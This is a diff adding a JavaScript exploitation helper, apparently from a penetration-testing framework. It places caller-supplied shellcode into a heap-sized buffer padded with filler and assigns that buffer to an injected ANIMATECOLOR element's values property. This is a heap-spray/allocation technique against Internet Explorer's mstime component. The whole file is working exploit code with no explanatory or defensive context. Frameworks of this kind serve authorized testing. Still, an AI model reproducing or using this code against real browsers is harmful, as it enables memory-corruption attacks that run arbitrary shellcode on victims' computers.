+++ data/js/exploitation/mstime_malloc.js
@@ -1,0 +1,31 @@
+function mstime_malloc(oArg) {
+  shellcode     = oArg.shellcode;
+  offset        = oArg.offset;
+  heapBlockSize = oArg.heapBlockSize;
+  objId         = oArg.objId;
+
+  if (shellcode     == undefined) { throw "Missing argument: shellcode"; }
+  if (offset        == undefined) { offset = 0; }
+  if (heapBlockSize == undefined) { throw "Size must be defined"; }
+
+  buf = "";
+  for (i=0; i < heapBlockSize/4; i++) {
+    if (i == offset) {
+      if (i == 0) { buf += shellcode;       }
+      else        { buf += ";" + shellcode; }
+    }
+    else {
+      buf += ";#W00TA";
+    }
+  }
+
+  e = document.getElementById(objId);
+  if (e == null) {
+    eleId = "W00TB"
+    acTag = "<t:ANIMATECOLOR id='"+ eleId  + "'/>"
+    document.body.innerHTML = document.body.innerHTML + acTag;
+    e = document.getElementById(eleId);
+  }
+  try { e.values = buf; }
+  catch (e) {}
+}
